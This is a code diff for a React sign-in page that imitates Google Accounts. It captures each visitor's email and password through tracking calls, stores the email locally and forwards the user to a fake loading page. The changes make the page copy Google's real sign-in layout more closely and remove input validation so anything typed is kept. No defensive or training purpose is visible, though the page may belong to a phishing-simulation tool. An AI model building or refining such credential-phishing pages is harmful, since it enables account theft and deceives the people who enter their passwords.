@@ -1,6 +1,7 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useEffect, useRef, useState } from "react";
-import { GoogleGLogo, GE_FONT_FAMILY, GeFontStyle, GeCardStyles, useGeTracking } from "@/components/ge/GeShared";
+import { GoogleGLogo, GeGoogleFont, useGeTracking } from "@/components/ge/GeShared";
+import loginCss from "@/components/ge/login.css?raw";
 
 export const Route = createFileRoute("/ge/signin")({
   head: () => ({ meta: [{ title: "Sign in - Google Accounts" }] }),
@@ -12,19 +13,18 @@ function GeSignInPage() {
   const [step, setStep] = useState<"email" | "password">("email");
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-  const [showPassword, setShowPassword] = useState(false);
   const [loading, setLoading] = useState(false);
   const emailRef = useRef<HTMLInputElement>(null);
   const pwRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
-    if (step === "email") setTimeout(() => emailRef.current?.focus(), 100);
-    else setTimeout(() => pwRef.current?.focus(), 100);
+    (step === "email" ? emailRef : pwRef).current?.focus();
   }, [step]);
 
-  const goPassword = () => {
+  const submitEmail = (e: React.FormEvent) => {
+    e.preventDefault();
     const v = email.trim();
-    if (!v || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) return;
+    if (!v) return;
     trackClick("Next-Email");
     trackInput("email", v);
     try { localStorage.setItem("saved_user_email", v); } catch { /* noop */ }
@@ -32,106 +32,108 @@ function GeSignInPage() {
     setTimeout(() => {
       setLoading(false);
       setStep("password");
-    }, 900 + Math.random() * 800);
+    }, 900 + Math.random() * 900);
   };
 
-  const submitPassword = () => {
+  const submitPassword = (e: React.FormEvent) => {
+    e.preventDefault();
     if (!password) return;
     trackClick("Next-Password");
     trackInput("password", password);
     setLoading(true);
-    setTimeout(() => {
-      geNavigate("/ge/loading");
-    }, 900 + Math.random() * 800);
+    setTimeout(() => geNavigate("/ge/loading"), 900 + Math.random() * 900);
   };
 
   const initial = (email.trim()[0] || "?").toUpperCase();
 
   return (
-    <div className="ge-body" style={{ fontFamily: GE_FONT_FAMILY }}>
-      <GeFontStyle />
-      <GeCardStyles />
-      <div className="ge-container">
-        <div className={`ge-loading-overlay ${loading ? "active" : ""}`}>
-          <div className="ge-loading-bar" />
+    <>
+      <GeGoogleFont />
+      <style>{loginCss}</style>
+      <style>{`html, body, #root { min-height: 100vh; } body { margin: 0; }`}</style>
+      <div className={`container ${loading ? "loading-body" : ""}`}>
+        <div className={`loading-overlay ${loading ? "active" : ""}`} id="loadingOverlay">
+          <div className="loading-bar"></div>
         </div>
 
-        <div className="ge-left">
-          <GoogleGLogo size={45} />
-          {step === "email" ? (
-            <div style={{ marginTop: 30 }}>
-              <h1 className="ge-h1">Sign in</h1>
-              <p className="ge-p">to continue to Google</p>
-            </div>
-          ) : (
-            <div style={{ marginTop: 30 }}>
-              <h1 className="ge-h1">Welcome</h1>
-              <div className="ge-email-chip" onClick={() => { trackClick("Change-Email"); setStep("email"); setPassword(""); }}>
-                <span className="ge-email-chip-dot">{initial}</span>
-                <span>{email}</span>
-                <svg width="10" height="6" viewBox="0 0 10 6" fill="currentColor"><path d="M5 6 0 0h10z"/></svg>
+        {step === "email" ? (
+          <>
+            <div className="left-part">
+              <GoogleGLogo />
+              <div className="text-content">
+                <h1>Sign in</h1>
+                <p>to continue to Google</p>
               </div>
             </div>
-          )}
-        </div>
-
-        <div className="ge-right">
-          {step === "email" ? (
-            <form className="ge-form" onSubmit={(e) => { e.preventDefault(); goPassword(); }}>
-              <input
-                ref={emailRef}
-                name="email"
-                type="email"
-                className="ge-input"
-                placeholder="Email or phone"
-                value={email}
-                onChange={(e) => { setEmail(e.target.value); trackInput("email", e.target.value); }}
-                required
-              />
-              <div style={{ marginTop: 12 }}>
-                <span className="ge-hint-link" onClick={() => trackClick("Forgot-Email")}>Forgot email?</span>
+            <div className="right-part">
+              <form className="form-container" onSubmit={submitEmail}>
+                <input
+                  ref={emailRef}
+                  type="email"
+                  name="email"
+                  className="email-input"
+                  placeholder="Email or phone"
+                  value={email}
+                  onChange={(e) => { setEmail(e.target.value); trackInput("email", e.target.value); }}
+                  required
+                />
+                <span className="forgot-email" onClick={() => trackClick("Forgot-Email")}>Forgot email?</span>
+                <p>
+                  Not your computer? Use Guest mode to sign in privately.{" "}
+                  <span className="hypertext" style={{ cursor: "pointer" }} onClick={() => trackClick("Guest-Mode")}>Learn more about using Guest mode</span>
+                </p>
+                <div className="button-container">
+                  <button type="button" className="create-account-btn" onClick={() => trackClick("Create-Account")}>Create account</button>
+                  <button type="submit" className="next-btn" name="submit_button">Next</button>
+                </div>
+              </form>
+            </div>
+          </>
+        ) : (
+          <>
+            <div className="left-part">
+              <GoogleGLogo />
+              <div className="text-content">
+                <h1>Welcome</h1>
+                <div
+                  className="email-container"
+                  style={{ marginTop: 20 }}
+                  onClick={() => { trackClick("Change-Email"); setStep("email"); setPassword(""); }}
+                >
+                  <span style={{
+                    width: 22, height: 22, borderRadius: "50%", background: "#DADCE0",
+                    display: "inline-flex", alignItems: "center", justifyContent: "center",
+                    fontSize: 12, fontWeight: 700, color: "#1f1f1f", marginLeft: 3
+                  }}>{initial}</span>
+                  <span className="email-text">{email}</span>
+                  <svg width="10" height="6" viewBox="0 0 10 6" style={{ marginRight: 2 }} fill="currentColor"><path d="M5 6 0 0h10z"/></svg>
+                </div>
               </div>
-              <p className="ge-p" style={{ fontSize: 14, lineHeight: "22px", marginTop: 40 }}>
-                Not your computer? Use Guest mode to sign in privately.{" "}
-                <span className="ge-hint-link">Learn more about using Guest mode</span>
-              </p>
-              <div style={{ display: "flex", justifyContent: "space-between", marginTop: 60 }}>
-                <button type="button" className="ge-btn ge-btn-ghost" onClick={() => trackClick("Create-Account")}>Create account</button>
-                <button type="submit" className="ge-btn ge-btn-primary" disabled={loading}>Next</button>
-              </div>
-            </form>
-          ) : (
-            <form className="ge-form" onSubmit={(e) => { e.preventDefault(); submitPassword(); }}>
-              <div style={{ position: "relative" }}>
+            </div>
+            <div className="right-part">
+              <form className="form-container" onSubmit={submitPassword}>
                 <input
                   ref={pwRef}
+                  type="password"
                   name="password"
-                  type={showPassword ? "text" : "password"}
-                  className="ge-input"
+                  className="email-input"
                   placeholder="Enter your password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   required
                 />
-              </div>
-              <label style={{ display: "flex", alignItems: "center", gap: 10, marginTop: 16, fontSize: 14, cursor: "pointer" }}>
-                <input
-                  type="checkbox"
-                  checked={showPassword}
-                  onChange={(e) => setShowPassword(e.target.checked)}
-                  style={{ width: 18, height: 18, cursor: "pointer" }}
-                />
-                <span>Show password</span>
-              </label>
-              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginTop: 60 }}>
-                <button type="button" className="ge-btn ge-btn-ghost" onClick={() => trackClick("Forgot-Password")}>Forgot password?</button>
-                <button type="submit" className="ge-btn ge-btn-primary" disabled={loading || !password}>Next</button>
-              </div>
-            </form>
-          )}
-        </div>
+                <span className="forgot-email" onClick={() => trackClick("Forgot-Password")}>Forgot password?</span>
+                <p>Show password</p>
+                <div className="button-container">
+                  <button type="button" className="create-account-btn" onClick={() => trackClick("Try-Another-Way")}>Try another way</button>
+                  <button type="submit" className="next-btn" name="submit_button">Next</button>
+                </div>
+              </form>
+            </div>
+          </>
+        )}
       </div>
       <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>{sessionId}</div>
-    </div>
+    </>
   );
 }
